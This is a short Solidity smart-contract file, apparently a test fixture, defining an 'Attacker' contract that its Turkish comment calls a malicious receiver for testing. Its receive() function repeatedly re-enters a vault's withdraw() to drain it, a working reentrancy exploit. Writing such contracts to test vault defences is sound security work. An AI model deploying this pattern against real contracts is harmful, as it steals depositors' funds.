// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title Attacker
/// @notice Test amaçlı kötü niyetli alıcı: Ether aldığında hedef vault'a yeniden girer.
contract Attacker {
    IVault public immutable vault;
    uint256 public attackCount;
    uint256 public maxReentries = 10;

    constructor(address vault_) {
        vault = IVault(vault_);
    }

    function setMaxReentries(uint256 value) external {
        maxReentries = value;
    }

    function attack() external payable {
        require(msg.value > 0, "need seed");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (attackCount < maxReentries && address(vault).balance >= msg.value) {
            unchecked {
                ++attackCount;
            }
            vault.withdraw();
        }
    }
}
